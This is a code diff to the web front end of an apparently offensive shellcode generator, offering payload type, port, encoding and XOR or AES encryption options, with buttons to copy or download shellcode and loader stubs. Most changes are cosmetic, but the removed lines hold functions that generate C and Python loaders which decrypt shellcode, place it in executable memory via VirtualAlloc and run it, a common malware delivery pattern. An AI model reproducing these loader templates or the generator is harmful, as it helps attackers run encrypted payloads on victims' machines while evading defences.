@@ -188,8 +188,8 @@
                 <button type="button" onclick="changeView('python')">Python</button>
                 <button type="button" onclick="changeView('raw')">Raw Bytes</button>
             </div>
-            <pre><code id="shellcode-output" class="plaintext">No output yet...</code></pre>
-            <button onclick="copyShellcode()">📋 Copy</button>
+            <pre><code id="shellcodeOutput" class="plaintext">No output yet...</code></pre>
+            <button id="copyShellcodeBtn">📋 Copy</button>
             <button onclick="downloadShellcode()">⬇️ Download Shellcode</button>
             <button onclick="downloadStub('c')">.c Loader</button>
             <button onclick="downloadStub('python')">.py Loader</button>
@@ -201,7 +201,7 @@
         let encodedShellcode = '';
 
         function highlight() {
-            const codeBlock = document.getElementById('shellcode-output');
+            const codeBlock = document.getElementById('shellcodeOutput');
             hljs.highlightElement(codeBlock);
         }
 
@@ -211,7 +211,7 @@
             document.getElementById('commandGroup').style.display = type === 'exec' ? 'block' : 'none';
         });
 
-        document.getElementById('encryption').addEventListener('change', function() {
+        document.getElementById('encryption').addEventListener('change', function () {
             const keyGroup = document.getElementById('keyGroup');
             keyGroup.style.display = this.value !== 'none' ? 'block' : 'none';
         });
@@ -228,10 +228,10 @@
             const command = document.getElementById('command').value;
             const key = document.getElementById('key').value;
 
-            const data = { 
-                type, 
+            const data = {
+                type,
                 platform,
-                port, 
+                port,
                 encoding,
                 encryption
             };
@@ -252,12 +252,12 @@
                     document.getElementById('result').style.display = 'block';
                     document.querySelector('.view-tabs button.active').click();
                 } else {
-                    document.getElementById('shellcode-output').textContent = 'Error: ' + (data.error || 'Unknown');
+                    document.getElementById('shellcodeOutput').textContent = 'Error: ' + (data.error || 'Unknown');
                 }
                 highlight();
             })
             .catch(err => {
-                document.getElementById('shellcode-output').textContent = 'Client error: ' + err;
+                document.getElementById('shellcodeOutput').textContent = 'Client error: ' + err;
                 highlight();
             });
         });
@@ -276,113 +276,32 @@
                 output = encodedShellcode.match(/.{1,2}/g)?.join(' ');
             }
 
-            document.getElementById('shellcode-output').textContent = output || '';
+            document.getElementById('shellcodeOutput').textContent = output || '';
             highlight();
         }
 
-        function copyShellcode() {
-            const code = document.getElementById('shellcode-output').textContent;
-            navigator.clipboard.writeText(code).then(() => alert("Shellcode copied!"));
-        }
+        document.addEventListener("DOMContentLoaded", function () {
+            const copyBtn = document.getElementById("copyShellcodeBtn");
+            const shellcodeOutput = document.getElementById("shellcodeOutput");
+
+            copyBtn.addEventListener("click", function () {
+                const text = shellcodeOutput.innerText || shellcodeOutput.textContent;
+                navigator.clipboard.writeText(text).then(() => {
+                    copyBtn.innerText = "✅ Copied!";
+                    setTimeout(() => copyBtn.innerText = "📋 Copy", 1500);
+                }).catch(err => {
+                    alert("Failed to copy shellcode: " + err);
+                });
+            });
+        });
 
         function downloadShellcode() {
-            const content = document.getElementById('shellcode-output').textContent;
+            const content = document.getElementById('shellcodeOutput').textContent;
             const blob = new Blob([content], { type: 'text/plain' });
             const a = document.createElement('a');
             a.href = URL.createObjectURL(blob);
             a.download = 'shellcode.txt';
             a.click();
-        }
-
-        function downloadStub(format) {
-            const shellcode = document.getElementById('shellcode-output').textContent;
-            const platform = document.getElementById('platform').value;
-            const encryption = document.getElementById('encryption').value;
-            const key = document.getElementById('key').value;
-
-            let stub = '';
-            if (format === 'c') {
-                stub = generateCLoader(shellcode, platform, encryption, key);
-            } else if (format === 'python') {
-                stub = generatePythonLoader(shellcode, platform, encryption, key);
-            } else if (format === 'exe') {
-                // This would require server-side compilation
-                alert('EXE generation requires server-side compilation. Please use the C loader instead.');
-                return;
-            }
-
-            const blob = new Blob([stub], { type: 'text/plain' });
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = format === 'c' ? 'loader.c' : 'loader.py';
-            a.click();
-        }
-
-        function generateCLoader(shellcode, platform, encryption, key) {
-            let loader = `#include <windows.h>\n\n`;
-            
-            if (encryption !== 'none') {
-                loader += `// Decryption function\n`;
-                if (encryption === 'xor') {
-                    loader += `void decrypt(char* data, size_t len, const char* key) {\n`;
-                    loader += `    for(size_t i = 0; i < len; i++) {\n`;
-                    loader += `        data[i] ^= key[i % strlen(key)];\n`;
-                    loader += `    }\n}\n\n`;
-                } else if (encryption === 'aes') {
-                    loader += `// AES decryption implementation here\n`;
-                }
-            }
-
-            loader += `unsigned char shellcode[] = "${shellcode}";\n\n`;
-            loader += `int main() {\n`;
-            
-            if (encryption !== 'none') {
-                loader += `    decrypt(shellcode, sizeof(shellcode), "${key}");\n`;
-            }
-
-            if (platform === 'windows') {
-                loader += `    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n`;
-                loader += `    memcpy(exec, shellcode, sizeof(shellcode));\n`;
-                loader += `    ((void(*)())exec)();\n`;
-            } else {
-                loader += `    int (*ret)() = (int(*)())shellcode;\n`;
-                loader += `    ret();\n`;
-            }
-
-            loader += `    return 0;\n}\n`;
-            return loader;
-        }
-
-        function generatePythonLoader(shellcode, platform, encryption, key) {
-            let loader = `import ctypes\n`;
-            
-            if (encryption !== 'none') {
-                loader += `def decrypt(data, key):\n`;
-                if (encryption === 'xor') {
-                    loader += `    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])\n`;
-                } else if (encryption === 'aes') {
-                    loader += `    # AES decryption implementation here\n`;
-                    loader += `    pass\n`;
-                }
-                loader += `\n`;
-            }
-
-            loader += `shellcode = ${shellcode}\n\n`;
-            
-            if (encryption !== 'none') {
-                loader += `shellcode = decrypt(shellcode, "${key}")\n\n`;
-            }
-
-            if (platform === 'windows') {
-                loader += `ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n`;
-                loader += `exec = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)\n`;
-                loader += `ctypes.windll.kernel32.RtlMoveMemory(exec, shellcode, len(shellcode))\n`;
-                loader += `ctypes.windll.kernel32.CreateThread(0, 0, exec, 0, 0, 0)\n`;
-            } else {
-                loader += `ctypes.CDLL(None).call(shellcode)\n`;
-            }
-
-            return loader;
         }
 
         function toggleTheme() {
